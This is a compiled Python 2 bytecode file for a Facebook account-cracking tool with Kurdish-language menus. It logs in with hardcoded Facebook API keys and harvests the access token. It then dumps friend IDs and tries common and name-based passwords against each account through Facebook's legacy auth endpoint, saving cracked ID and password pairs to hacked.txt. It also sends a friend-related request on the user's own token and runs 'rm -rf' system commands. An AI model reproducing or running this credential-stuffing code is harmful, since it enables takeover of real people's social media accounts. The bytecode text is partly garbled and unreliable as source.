ó
!¤t`c           @   sÈ  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d   Z e   e  j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qÆ Wy d  d l Z Wn e k
 r6e  j d	  n Xy d  d l Z Wn8 e k
 re  j d
  e j d  e  j d  n Xd  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z  e  j! e"  e  j# e j$ j%   d d d d f g e  _& d d f g e  _& d   Z' d   Z( e  j d  d   Z) d   Z* d   Z+ d   Z, d Z- g  a. g  Z/ g  Z0 d Z1 d Z2 e  j d   d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z d  d! l3 m4 Z4 d"   Z5 d# GHe  j d   e e  e j d  e j   Z  e  j! e"  e  j# e j$ j%   d d d d$ f g e  _& d%   Z6 d&   Z( d'   Z) d( Z7 d)   Z+ d Z- g  Z8 g  Z9 g  Z: g  Z; d Z1 d Z2 e  j d   d* Z< d+ Z= d, Z> d- Z? xy e? d- k r{e@ d.  ZA eA e= k rfe@ d/  ZB eB e> k rQd0 eA GHd1 Z? n d2 GHe  j d3  n d2 GHe  j d4  qWe< GHd5   ZC d6   ZD d7   ZE d8   ZF d9   ZG eH d: k rÄeC   n  d S(;   iÿÿÿÿNc          C   sÒ   t  t j    t  t j    }  d j |   } d | GHye t j d  j } | | k r d GHt  t j    } t j	 d  n d GHt j	 d  t
 j   Wn, t
 j   t d k rÎ t GHt   qÎ n Xd  S(   Nt   -s   [37;1mYour ID : sA   https://raw.githubusercontent.com/hal012/activt/main/kurdo_hackers   [92mYOUR ID IS ACTIVE.........i   sX   [91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @ravo_m.......t   __main__(   t   strt   ost   geteuidt   getlogint   joint   requestst   gett   textt   timet   sleept   syst   exitt   namet   logot   chk(   t   uuidt   idt   httpCahtt   msg(    (    s$   /storage/emulated/0/TEMINAL/login.pyR      s$    "	
s   rm -rf .txti  iGô i s   .txtt   as4   No Module Named Requests! type:pip2 install requestss6   No Module Named Mechanize! type:pip2 install mechanizei   s   Then type: python2 fbi.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c           C   s   d GHt  j j   d  S(   Ns   Thanks.(   R   R   R   (    (    (    s$   /storage/emulated/0/TEMINAL/login.pyt   keluar@   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s$   /storage/emulated/0/TEMINAL/login.pyt   acakE   s
    0s   mkdir anggaxd/cloned.txtc         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replaceR   R   t   stdoutt   write(   R$   R%   R'   t   jR   (    (    s$   /storage/emulated/0/TEMINAL/login.pyR#   N   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R+   R,   t   flushR
   R   (   t   zt   e(    (    s$   /storage/emulated/0/TEMINAL/login.pyt   jalanY   s    c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;93mPlease Wait [1;93mi   (   R   R+   R.   R
   R   (   t   titikt   o(    (    s$   /storage/emulated/0/TEMINAL/login.pyt   tik`   s
    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R   R+   R,   R.   R
   R   (   R/   R0   (    (    s$   /storage/emulated/0/TEMINAL/login.pyt   psbh   s    i    s   [31mNot Vulns	   [32mVulnt   clear(   t   BeautifulSoupc         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R+   R,   R.   R
   R   (   R/   R0   (    (    s$   /storage/emulated/0/TEMINAL/login.pyt   anime}   s    s	   FB GRABERs   Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1c          C   s!   d }  t  |   t j j   d  S(   Ns,   
    [33;1mEXTING[37;1m.............[0m
	(   R8   R   R   R   (   t   exlogo(    (    s$   /storage/emulated/0/TEMINAL/login.pyt   kelwa   s    
c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   NR   R   R   i    i   (   R   R    R!   R"   R#   (   R$   R%   R&   R'   (    (    s$   /storage/emulated/0/TEMINAL/login.pyR(      s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   R)   R*   R   R   R+   R,   (   R$   R%   R'   R-   R   (    (    s$   /storage/emulated/0/TEMINAL/login.pyR#      s    (
s   



[1;91m_
| | __ _   _  _ __  __| |  ___
| |/ /| | | || '__|/ _` | / _ |   < | |_| || |  | (_| || (_) |
|_|\_\ \__,_||_|   \__,_| \___/

c          C   s[   d d d d d d d g }  d GHx4 |  D], } d	 | d
 Gt  j j   t j d  q' Wd  S(   Nt   .s   ..s   ...s   ....s   .....s   ......s   .......t    s    [32;1m    Wait to Login[37;1ms   [0mi   (   R   R+   R.   R
   R   (   R2   R3   (    (    s$   /storage/emulated/0/TEMINAL/login.pyR4   µ   s      s   

[1;91m_
| | __ _   _  _ __  __| |  ___
| |/ /| | | || '__|/ _` | / _ |   < | |_| || |  | (_| || (_) |
|_|\_\ \__,_||_|   \__,_| \___/

t   KURDOt   RAWAt   trues6   [1;96m[â] [0;31mUSERNAME TOOLAKA Bnusa[1;96m>>>> s6   [1;96m[â] [0;31mPASSWORD TOOLAKA Bnusa[1;96m>>>> s   Logged in successfully as t   falset   Halayas!   xdg-open https://t.me/@SHELL_BLNDs    xdg-open https://t.me/SHELL_BLNDc          C   s²  t  j d  y t d d  }  t   Wnt t f k
 r­t GHd } | GHt d  } t d  } t   y t	 j d  Wn  t
 j k
 r d GHt   n Xt t	 j _ t	 j d	 d
  | t	 j d <| t	 j d <t	 j   t	 j   } d | k rOy.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d 6d  d! 6} t j d"  } | j |  | j   } | j i | d# 6 d$ } t j | d% | }	 t j |	 j  }
 t d d&  } | j |
 d'  | j   d( GHt j d) |
 d'  t  j! d*  t   WqOt j" j# k
 rKd+ GHt   qOXn  d, | k rd- GHt  j d.  t  j! d*  t$   q®d/ GHt  j d.  t  j! d*  t$   n Xd  S(0   NR6   s	   login.txtt   rsQ   
   ${[37;91m<<<<<<<<<<<[[34;91mLogin Facebook[0m][31;91m>>>>>>>>>>>[0m}$
		s1   [1;91m[+] [0;34mEnter ID/Email [1;91m: [1;91ms1   [1;91m[+] [0;34mEnter Password [1;91m: [1;91ms   https://m.facebook.comsD   
[31;1m    [Ã]% LOST INTERNET CONNECTION PLEASE CHECK YOU INTERNETt   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR%   t   access_tokens(   
[32;1m    [â] Login Ba Sarkawtwe[0msM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=i   s)   
[33;1m    [%]Â® XATAKAT XAWA BIGORA[0mt
   checkpoints?   
[34;1m    [%]Â© Your Account in CheckPoint Cant Be Used /[0ms   rm -rf login.txts_   
[37;1m[{Ã}] Your [36;1mEmail[0m[37;1mOr Your [33;1mPassword[37;1mIS [31;1m Wrong /[0m(%   R   t   systemt   opent   menut   KeyErrort   IOErrorR   t	   raw_inputR4   t   brt	   mechanizet   URLErrorR:   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestR   R   t   jsont   loadsR	   R,   t   closet   postR
   R   t
   exceptionsR   t   login(   t   tokett   fblogomR   t   pwdt   urlRV   t   dataR   R   RB   R/   t   unikers(    (    s$   /storage/emulated/0/TEMINAL/login.pyRs   á   sh    
S

c    
      C   sÞ  t  j d  y t d d  j   }  WnD t k
 rl t  j d  d GHt  j d  t j d  t   n Xyv t j	 d |   } t
 j | j  } | d } | d	 } t j	 d
 |   } t
 j | j  } t | d d  } Wnf t k
 r)t  j d  d GHt  j d  t j d  t   n# t j j k
 rKd GHt   n Xt  j d  d } | GHd GHt d d | d  t d | d  t d d | d  d GHt d  d GHd }	 |	 GHt j d  t   d  S(   NR6   s	   login.txtRB   s    [31;1m[#] Your Token Is Expireds   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=R   R   s7   https://graph.facebook.com/me/subscribers?access_token=t   summaryt   total_counts;   
[34;1m[%]Â© Your Account in CheckPoint Cant Be Used /[0ms    
[33;1mXATAKAT XAWA BIGORA [0msq   
[32;1m
	.-~~~~-. 
       /   (o)(o)
      /      .. |
    /\    \____/
    / \   ,\_/  
     \    /      
[0m
sR   [32;1m******************[37;1m[[33;1mACCOUNT DATA[37;1m][32;1m***********[0ms   [â] Facbook Name : s   [ s    ]s   [â] ID : s   [â] ToTal FOLOW : R<   s3   [37;1m********************************************s´   
********************************************
#[31;1m[ 1 ] BO DAST PE KRDNI HACK [0m !
#[32;1m[ 0 ] BO LOGOUT KRDNI ACAWNT [0m  !
********************************************
	s   [â] ID : [ (   R   RZ   R[   t   readR^   R
   R   Rs   R   R   Rn   Ro   R	   R   R]   Rr   R   R:   R8   t   option(
   Rt   t   otwR   t   namefbR   t   otsR$   t   subidt   xxjt   opntn(    (    s$   /storage/emulated/0/TEMINAL/login.pyR\     sP    



c          C   s   t  d  }  |  d k r' d GHt   nn |  d k r= t   nX |  d k r| t d  d GHt j d  t j d	  t   n d
 GHt j d  t   d  S(   Ns   
[33;1m [@] Option : [37;1mR   s&   [31;1m [ Ï ] SHTI GHAYR AWANA MANWSARL   RR   s4   [37;1m[ ! ][0m [32;1mLOGIN OUT ACCOUNT.......[0mR<   i   s   rm -rf login.txts*   [34;1m Please SHTE GHAYR AWANA MANWSA[0m(	   R_   R}   t   graberR8   R
   R   R   RZ   R:   (   Ry   (    (    s$   /storage/emulated/0/TEMINAL/login.pyR}   X  s    



c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHt
   d  S(   NR6   s	   login.txtRB   s0   [37;1m[[33;1m T [0m][37;1m Token Expired[0ms   rm -rf login.txti   s&   [37;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>[0ms%   [34;1m[ 1 ] HACK KRDNI FRENDAKAN[0ms*   [32;1m[ 2 ] HACKKRDN LAREY ID PUBLIC [0ms   [37;1m[ 0 ] GARANAWA [0m(   R   RZ   R[   R|   Rt   R^   R
   R   Rs   R   t	   startgrab(    (    (    s$   /storage/emulated/0/TEMINAL/login.pyR   i  s     c          C   sW  g  }  t  d  } | d k r- d GHt   n| d k rÞ t j d  t GHd GHt d  t j d t  } t	 j
 | j  } x®| d	 D]M } | d
 } | j d  } d g } |  j t | d  d t |   q WnR| d k rt j d  t GHt  d  } d GHyB t j d | d t  }	 t	 j
 |	 j  }
 d |
 d
 d GHWn* t k
 r{d GHt j d  t   n Xd GHt j d | d t  } t	 j
 | j  } x | d	 D]N } | d
 } | j d  } | d } |  j t | d  d t |   q¹Wn" | d k r$t   n d GHt   d t t |    d GHt d  d d d  d! d" d# d$ g } x0 | D]( } d% | Gt j j   t j d&  quWt d'  d( GHg  } g  } d)   } t d*  } | j | |   t d+  d GHd, d GHd- t t |   d. d/ t t |   GHd GHd GHt GHt  d0  t j d  t   d  S(1   Ns   [32;1mCRACK : [37;1mR   s"   [31;1m [ Ï ] BA JWANE HALEBZHERARL   R6   s   [ # ] [37;1mRO[31;1mMA[0ms*   [33;1mDump All Friend [34;1mID......[0ms3   https://graph.facebook.com/me/friends?access_token=Rx   R   R<   i    R   t   |t   2s'   [37;1m[ â¤ ] ID YEK BNWSA LERA : [0ms"   [ # ] [37;1mRO[0m_+_[31;1MA[0ms   https://graph.facebook.com/s   ?access_token=s   [36;1mFacebook Name :  [33;1ms   [0ms   [31;1mID XALATA /[0mi   s
   [34;1mDIDs   /friends?access_token=RR   s   [32;1mFacebook ID.......[0ms$   [32;1m[ â¡ ] HAMW ID YEKAN [34;1ms/   [37;1m[ % ] TKAYA BOST........................R;   s   ..s   ...s   ....s   .....s   ......s   .......s   [32;1m[ â ] HACKINGi   s/   [34;1mBWASTA BO DAST PE KRDNI HACKAKA.........s5   [37;1m==============================================c         S   sÄ  |  j    j d  } | d } | d } y t j d  Wn t k
 rM n Xyh| d } t j d | d | d  } t j |  } d	 | k rd
 GHd | d GHd | d d GHd d d | d | d } t	 d d  } | j
 |  | j   t j | |  n¥d | d k rd GHd | d GHd | d d GHt	 d d  }	 |	 j
 d d d | d | d  |	 j   t j | |  n | d }
 t j d | d |
 d  } t j |  } d	 | k rPd, GHd | GHd |
 d d GHd d d | d |
 d } t	 d d  } | j
 |  | j   t j | |
  ne
d | d k rÑd GHd | GHd |
 d d GHt	 d d  }	 |	 j
 d d d | d |
 d  |	 j   t j | |
  nä	| d } t j d | d | d  } t j |  } d	 | k rd- GHd  | GHd | d d GHd d d | d | d } t	 d d  } | j
 |  | j   t j | |  n)	d | d k rd! GHd | GHd | d d GHt	 d d  }	 |	 j
 d d d | d | d  |	 j   t j | |  n¨d" } t j d | d | d  } t j |  } d	 | k rÄd. GHd | GHd | d d GHd d d | d | d } t	 d d  } | j
 |  | j   t j | |  nñd | d k rEd# GHd | GHd | d d GHt	 d d  }	 |	 j
 d d d | d | d  |	 j   t j | |  npd$ } t j d | d | d  } t j |  } d	 | k r d% d GHd  | GHd | d d GHd d d | d | d } t	 d d  } | j
 |  | j   t j | |  nµd | d k rd& GHd | GHd | d d GHt	 d d  }	 |	 j
 d d d | d | d  |	 j   t j | |  n4d' } t j d | d | d  } t j |  } d	 | k r<d% d GHd  | GHd | d d GHd d d | d | d } t	 d d  } | j
 |  | j   t j | |  nyd | d k r½d& GHd | GHd | d d GHt	 d d  }	 |	 j
 d d d | d | d  |	 j   t j | |  nød( } t j d | d | d  } t j |  } d	 | k rxd% d GHd  | GHd | d d GHd d d | d | d } t	 d d  } | j
 |  | j   t j | |  n=d | d k rùd& GHd | GHd | d d GHt	 d d  }	 |	 j
 d d d | d | d  |	 j   t j | |  n¼d) } t j d | d | d  } t j |  } d	 | k r´	d% d GHd  | GHd | d d GHd d d | d | d } t	 d d  } | j
 |  | j   t j | |  nd | d k r5
d& GHd | GHd | d d GHt	 d d  }	 |	 j
 d d d | d | d  |	 j   t j | |  n| d* } t j d | d | d  } t j |  } d	 | k rô
d% d GHd  | GHd | d d GHd d d | d | d } t	 d d  } | j
 |  | j   t j | |  nÁd | d k rud& GHd | GHd | d d GHt	 d d  }	 |	 j
 d d d | d | d  |	 j   t j | |  n@| d+ } t j d | d | d  } t j |  } d	 | k r4d% d GHd  | GHd | d d GHd d d | d | d } t	 d d  } | j
 |  | j   t j | |  n d | d k rµd& GHd | GHd | d d GHt	 d d  }	 |	 j
 d d d | d | d  |	 j   t j | |  n  Wn n Xd  S(/   NR   i    i   t   Grabert   1234s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RX   s   [32;1m HACKEDs   [32;1mID : [37;1ms   [0ms   [32;1mPassword : [37;1ms   
s   { = BLND = } s   
HACKED BooM s
   
[ ID ] : s   
[ PASS ] : s   
 	 Tele: @SHELL_BLNDs
   hacked.txtR   s   www.facebook.comt	   error_msgs
   [31;1mCP+s   [31;1mID : [37;1ms   [31;1mPassword : [37;1ms   chkpoint.txts	   
CHKPOINTt   12345s   [31;1mCPðºt   123456s   [32;1mID : [37;1m s   [31;1mCPðt   11223344s   [31;1mCPðt
   1234554321s   [32;1m HACKEDð»s	   [31;1mCPt
   1122334455t
   1234512345t   123456654321t   1122t   1212s   [32;1m HACKED[0ms   [32;1m HACKED[0ms   [32;1m HACKED[0m(   t   stript   splitR   t   mkdirt   OSErrort   urllibt   urlopenRn   t   loadR[   R,   Rp   t   okst   appendt   cekpoint(   t   argt   ust   usert   firstt   pass1Rx   t   qt	   msghkfilet   filehackt   cekt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   pass8t   pass9t   pass10(    (    s$   /storage/emulated/0/TEMINAL/login.pyt   main±  s¤   



%

	
	%

	
	%
	
	%
		
	%
		
	%
		
	%
		
	%

		
	%

		
	%
i   s*   [37;1m<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>[0ms   [32;1m[ â ] HACKAKA TAWAW BWs;   [37;1mHACK BW [32;1mOKS/[31;1mCHECKPOINT[37;1m: [32;1ms   [37;1m/s   [31;1ms   [ENTER](   R_   R   R   RZ   R   R8   R   R   Rt   Rn   Ro   R	   R   R   R   R]   R
   R   R   R\   R"   R   R+   R.   R   t   map(   R   t   peakRB   R/   t   st   nt   hR   t   idtt   jokt   opR'   R2   R3   R   R   R°   t   p(    (    s$   /storage/emulated/0/TEMINAL/login.pyR   |  s    


	,

,

  
	è
	-
R   (I   R   R   R
   t   datetimeR    Rj   t   ret	   threadingRn   R   t	   cookielibt   getpassR   R   RZ   t   rangeR´   R!   t   nmbrR[   R+   R.   t   ImportErrorRa   R   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR`   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R(   R#   R1   R4   R5   t   backR   R   t   cpbt   vulnott   vulnt   bs4R7   R8   R:   R   t   berhasilt   listgrupt   phonet   pht   RHt   CorrectUsernamet   CorrectPasswordt   loopR_   t   usernameRH   Rs   R\   R}   R   R   t   __name__(    (    (    s$   /storage/emulated/0/TEMINAL/login.pyt   <module>   s¾   	
							
				
			:	=			ÿ +